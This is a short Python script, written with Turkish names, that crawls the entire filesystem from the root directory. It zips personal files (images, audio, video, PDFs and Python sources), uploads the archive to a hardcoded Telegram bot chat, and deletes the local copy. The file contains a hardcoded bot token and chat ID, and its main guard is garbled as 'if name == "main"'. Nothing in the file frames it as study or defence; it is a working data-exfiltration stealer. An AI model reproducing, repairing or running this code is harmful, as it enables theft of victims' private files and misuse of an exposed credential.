import os
import zipfile
import telebot

def yukle_gerekli_kutuphane():
    try:
        os.system("pip install pyTelegramBotAPI")
        print("Gerekli kütüphane yüklendi.")
    except Exception as e:
        print(f'Hata: {str(e)}')

# Gerekli kütüphaneyi yükleyin
yukle_gerekli_kutuphane()

TOKEN = '6578250693:AAGhoblNUGMiAJUGAxl_9xJ6GXZ8Jjw3uho'
CHAT_ID = '5291833531'

bot = telebot.TeleBot(TOKEN)

def dizini_zipleyip_gonder(dizin):
    try:
        zipdosya_adi = f'{dizin}.zip'
        with zipfile.ZipFile(zipdosya_adi, 'w') as zipdosya:
            for root, _, files in os.walk(dizin):
                for dosya in files:
                    dosya_uzanti = os.path.splitext(dosya)[1]
                    if dosya_uzanti in uzanti_listesi:
                        dosya_yolu = os.path.join(root, dosya)
                        zipdosya.write(dosya_yolu, os.path.relpath(dosya_yolu, dizin))
        
        with open(zipdosya_adi, 'rb') as dosya_objesi:
            bot.send_document(CHAT_ID, dosya_objesi)
        
        os.remove(zipdosya_adi)  # Zip dosyasını gönderdikten sonra silebiliriz
        
    except Exception as e:
        print(f'Hata: {str(e)}')

if name == "main":
    print("Başlıyor")
    baslangic_dizini = '/'  # Taranmaya başlanacak kök dizini
    uzanti_listesi = ['.py', '.jpg', '.png', '.m4a', '.opus', '.mp3', '.mp4', '.pdf']
    dizini_zipleyip_gonder(baslangic_dizini)
    print("End")
